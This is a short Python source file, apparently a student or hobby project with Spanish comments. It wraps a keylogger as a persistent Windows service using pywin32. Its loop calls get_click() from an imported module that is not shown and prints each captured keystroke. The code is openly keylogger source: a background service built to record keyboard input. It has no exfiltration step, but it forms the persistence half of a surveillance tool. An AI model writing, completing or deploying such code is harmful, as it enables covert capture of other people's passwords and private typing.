# KeyloggerService.py
import win32serviceutil
import win32service
import win32event
import servicemanager
import get_Click_In_Keyboard


class KeyloggerService(win32serviceutil.ServiceFramework):
    _svc_name_ = "KeyloggerServicePython"
    _svc_display_name_ = "Keylogger Service"

    def __init__(self, args):
        win32serviceutil.ServiceFramework.__init__(self, args)
        self.running = True
        self.hWaitStop = win32event.CreateEvent(None, 0, 0, None)

    def SvcStop(self):
        self.running = False
        self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)
        win32event.SetEvent(self.hWaitStop)

    def SvcDoRun(self):
        self.running = True
        servicemanager.LogMsg(
            servicemanager.EVENTLOG_INFORMATION_TYPE,
            servicemanager.PYS_SERVICE_STARTED,
            (self._svc_name_, '')
        )
        self.main()

    def main(self):
        while self.running:
            print("Servicio ejecutándose...")
            key = get_Click_In_Keyboard.get_click()
            # Aquí procesas lo que obtenga get_click()
            print("Capturada tecla: " + key)


if __name__ == '__main__':
    win32serviceutil.HandleCommandLine(KeyloggerService)
